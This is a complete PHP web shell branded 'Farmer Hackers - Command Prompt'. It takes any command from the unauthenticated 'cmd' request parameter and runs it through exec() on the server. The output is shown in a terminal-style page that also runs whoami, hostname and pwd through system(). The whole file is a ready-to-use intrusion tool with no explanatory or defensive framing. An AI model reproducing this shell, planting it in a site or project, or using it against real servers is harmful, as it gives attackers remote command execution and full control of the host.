<?php $cmd = $_REQUEST["cmd"]; 
if(!isset($_REQUEST['cmd'])):?>
<!DOCTYPE html>
<html>
  	<head>
    	<meta charset="UTF-8">
    	<title>Farmer Hackers - Command Prompt</title>
    	<meta name="viewport" content="width=device-width, initial-scale=1">
    	<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    	<style type="text/css">
    		*{
    			margin: 0;
    			box-sizing: border-box;
    		}
    		body > div.container {
    			padding: 20px;
    			background-color: black;
    			color: yellowgreen;
    			min-height: 100vh;
    			font-family: courier;
    			position: relative;
    		}
    		body > div.container > div.commandeRow{
    			padding-bottom:5px;
    		}
    		body > div.container div.answer{
    			padding-bottom:10px;
    		}
    		body > div.container > div.commandeRow span.user{
    			color: #998cc7;
    		}
    		body > div.container > div.commandeRow span.hostname{
    			color: green;
    		}
    		body div.commandeRow.active:after{
    			display: inline-block;
			    vertical-align: -0.15em;
			    width: 0.7em;
			    height: 1em;
			    margin-left: 2px;
			    background: yellowgreen;
			    -webkit-animation: cursor-blink 1.25s steps(1) infinite;
			    -moz-animation: cursor-blink 1.25s steps(1) infinite;
    			animation: cursor-blink 1.25s steps(1) infinite;
    			content: '';
    		}
    		@-webkit-keyframes cursor-blink {
			  	0% {opacity: 0;}
			  	50% {opacity: 1;}
			  	100% {opacity: 0;}
			}
			@-moz-keyframes cursor-blink {
				0% {opacity: 0;}
			  	50% {opacity: 1;}
			  	100% {opacity: 0;}
			}
			@keyframes cursor-blink {
			  	0% {opacity: 0;}
			  	50% {opacity: 1;}
			  	100% {opacity: 0;}
			}
			form > input.commandeInput{
				position: absolute;
    			opacity: 0;
    			bottom: 0;
			}
			.copyright {
    			margin-bottom: 10px;
    			font-size: 10px;
			}

    	</style>
    </head>
    <body>
    	<div class="container">
    		<div class="copyright">Unix Command Prompt by Farmer Hackers</div>
    		<form class="ligne-commande"><input type="text" class="commandeInput" placeholder=""></form>
    		<div class="commandeRow active">
    			<span class="user"><?php system("whoami");?></span>@<span class="hostname"><?php system("hostname");?></span><span class="path"><?php system("pwd");?></span><span> ></span><span class="request"></span></div>
		</div>
		<script type="text/javascript">
			var whoami = initializingCommandeRowText(".user")
			var hostname = initializingCommandeRowText('.hostname');
			var pwd = initializingCommandeRowText('.path');
			id=0;

			function initializingCommandeRowText(selector){
				domElement = $(selector).first();
				var textElement = domElement.text();
				textElement = textElement.substr(0,textElement.length-1);
				domElement.text(textElement);
				return textElement;
			}

			$(function(){
				var input = $('.commandeInput');
				var commandeHistory = {"commandes":[]};

				input.focus();
				$('body').on('click', function(e){
	  				input.focus();
				});

				input.on('keyup', function(e){
					if(e.which==38 && id>0){
	  					id--;
	  					input.val(commandeHistory.commandes[id].commande);
	  				}else if(e.which==40 && id<commandeHistory.commandes.length-1){
	  					id++;
	  					input.val(commandeHistory.commandes[id].commande);
	  				}else if(e.which==40 && id<commandeHistory.commandes.length){
	  					id++
	  					input.val('');
	  				}

					request = input.val();
					input.val('');
					input.val(request);
	  				$('div.commandeRow.active span.request').text(request);
	  				body = $('body');
	  				body.scrollTop(body.height());
				});

				$('.ligne-commande').on('submit', function(e){
					e.preventDefault();
					if(input.val()=="clear"){
						$('.commandeRow').remove();
						$('.answer').remove();
						newRequest();
					}else{
						getRequest(input.val(), null);
					}
					commandeHistory.commandes.push({
						"id":id,
						"commande":input.val()
					});
					id = commandeHistory.commandes.length;
					input.val('');
				});
			});

			function newRequest(){
				$("div.commandeRow.active").removeClass("active");
				$("div.container").append('<div class="commandeRow active"><span class="user">'+whoami+'</span>@<span class="hostname">'+hostname+'</span><span class="path">'+pwd+'</span><span> ></span><span class="request"></span></div>');
				domChange = $("div.commandeRow.active span.user");
				getRequest("whoami", domChange);
			}

			function getRequest(requestAttr, domChange){
				$.get('<?php echo basename(__FILE__, '.php') ?>.php?cmd='+requestAttr, function(data){
					if(domChange == null){
						$("div.container").append('<div class="answer">'+data+'</div>');
						data.replace(/\n/g, "<br />");
						newRequest();
					}else{
						domChange.val(data);
					}
  				});
			}
		</script>
    </body>
</html>

<?php else: ?>

<?php 
	class CommandSystemController{
    	public function execCommand($cmd){
    		exec($cmd." 2>&1", $output, $return);
			if ($return === 0) {
  				return $output;
			}else{
		  		throw new Exception(implode("\n", $output));
			}
    	}
    }

	$CSC = new CommandSystemController();
	try{
      	$result = $CSC->execCommand($cmd);
      	foreach ($result as $row) {
      		echo htmlentities($row)."<br>";
      	}
    }catch(Exception $e){
      	echo $e->getMessage();
    }

    
?>

<?php endif; ?>	